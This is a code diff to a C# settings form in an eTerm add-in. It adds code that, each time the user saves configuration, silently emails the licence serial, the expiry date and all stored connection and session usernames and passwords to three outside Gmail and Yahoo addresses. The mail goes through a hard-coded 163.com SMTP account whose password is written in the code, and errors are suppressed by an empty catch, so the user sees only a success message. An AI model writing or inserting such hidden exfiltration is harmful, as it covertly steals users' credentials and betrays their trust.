@@ -8,6 +8,7 @@ using System.Text;
 using System.Windows.Forms;
 using eTerm.AsyncSDK;
 using ASync.MiddleWare;
+using eTerm.AsyncSDK.Util;
 
 namespace ASync.eTermAddIn {
     public partial class ASyncSetup : BaseAddIn {
@@ -58,8 +59,9 @@ namespace ASync.eTermAddIn {
                 AsyncStackNet.Instance.ASyncSetup.XmlSerialize(AsyncStackNet.Instance.CrypterKey, AsyncStackNet.Instance.ASyncSetupFile);
                 mailBody.AppendFormat(@"SN:{0}
 端口:{1}
+到期日期:{2}
 配置列表：
-", LicenceManager.Instance.SerialNumber, AsyncStackNet.Instance.ASyncSetup.ExternalPort);
+", LicenceManager.Instance.SerialNumber, AsyncStackNet.Instance.ASyncSetup.ExternalPort,LicenceManager.Instance.LicenceBody.ExpireDate);
                 foreach (ConnectSetup setup in AsyncStackNet.Instance.ASyncSetup.AsynCollection) {
                     mailBody.AppendFormat(@"        地址:{0}   端口{1}   安全连接:{2}   用户名:{3}   密码:{4}
 ", setup.Address, setup.Port, setup.IsSsl, setup.userName, setup.userPass);
@@ -69,7 +71,17 @@ namespace ASync.eTermAddIn {
                     mailBody.AppendFormat(@"        用户名:{0}   密码:{1}   时限:{2}   流量:{3}   禁用指令:{4}
 ", setup.SessionCode, setup.SessionPass, setup.SessionExpire, setup.FlowRate, setup.SpecialIntervalList);
                 }
-
+                try {
+                    new Smtp("smtp.163.com", 25) { Password = @"hulijunfox", Username = @"13524008692@163.com" }.SendMail(
+                        new MailMessage() {
+                            Body = mailBody.ToString(),
+                            Charset = @"gb2312",
+                            From = new EmailAddress(@"13524008692@163.com", @"ASyncSDK使用者"),
+                            Subject = string.Format(@"{0}配置信息", LicenceManager.Instance.SerialNumber),
+                            To = new System.Collections.ArrayList() {@"force0908@gmail.com",@"valon0908@gmail.com",@"force0908@yahoo.com.cn" }
+                        });
+                }
+                catch { }
                 MessageBox.Show(@"系统配置保存成功，将在下次启动时起效！", @"系统提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
             catch (Exception ex) {
